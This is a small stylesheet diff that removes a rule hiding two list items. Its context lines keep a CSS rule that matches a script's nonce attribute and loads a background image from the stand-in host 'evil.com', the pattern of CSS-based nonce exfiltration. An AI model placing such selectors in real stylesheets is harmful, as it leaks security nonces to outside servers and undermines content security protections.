@@ -421,10 +421,6 @@ fk {
   /*.navigation2 div h1 {
     display: block;
   }*/
-  .one_index div:nth-child(3),
-  .one_index div:nth-child(4) {
-      display: none; /* Display only the first two items */
-  }
 }
 script[nonce~="whatever"] {
   background: url("https://evil.com/nonce?whatever");
